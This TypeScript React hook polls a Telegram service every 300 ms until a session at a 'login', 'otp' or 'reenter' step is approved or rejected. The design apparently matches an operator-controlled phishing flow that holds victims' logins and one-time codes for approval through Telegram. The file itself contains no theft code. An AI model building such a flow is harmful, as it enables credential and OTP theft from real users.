import { useState, useEffect, useRef } from 'react';
import { telegramService } from '../services/telegramService';

interface UseTelegramPollingProps {
  sessionId: string | null;
  phone?: string;
  targetStep: 'login' | 'otp' | 'reenter';
  isActive: boolean;
  onApproved: () => void;
  onRejected: () => void;
}

export function useTelegramPolling({
  sessionId,
  phone,
  targetStep,
  isActive,
  onApproved,
  onRejected,
}: UseTelegramPollingProps) {
  const [status, setStatus] = useState<'idle' | 'pending' | 'approved' | 'rejected'>('idle');
  const [error, setError] = useState<string | null>(null);

  const isCancelledRef = useRef(false);
  const isFinishedRef = useRef(false);

  useEffect(() => {
    if (!isActive || !sessionId) {
      isCancelledRef.current = true;
      setStatus('idle');
      return;
    }

    isCancelledRef.current = false;
    isFinishedRef.current = false;
    setStatus('pending');
    setError(null);

    // Fast polling loop - 300ms intervals for quick feedback
    const runPollingLoop = async () => {
      while (!isCancelledRef.current && !isFinishedRef.current) {
        try {
          const result = await telegramService.pollUpdates(sessionId, targetStep, phone);

          if (isCancelledRef.current) break;

          if (result === 'approved') {
            isFinishedRef.current = true;
            setStatus('approved');
            onApproved();
            break;
          } else if (result === 'rejected') {
            isFinishedRef.current = true;
            setStatus('rejected');
            onRejected();
            break;
          }

          // Fixed 300ms delay for fast response
          if (!isCancelledRef.current && !isFinishedRef.current) {
            await new Promise((resolve) => setTimeout(resolve, 300));
          }
        } catch (err: any) {
          console.warn('Telegram polling check warning:', err);

          // On error, wait 500ms before retry
          if (!isCancelledRef.current && !isFinishedRef.current) {
            await new Promise((resolve) => setTimeout(resolve, 500));
          }
        }
      }
    };

    runPollingLoop();

    return () => {
      isCancelledRef.current = true;
    };
  }, [sessionId, phone, isActive, targetStep, onApproved, onRejected]);

  return {
    status,
    error,
  };
}
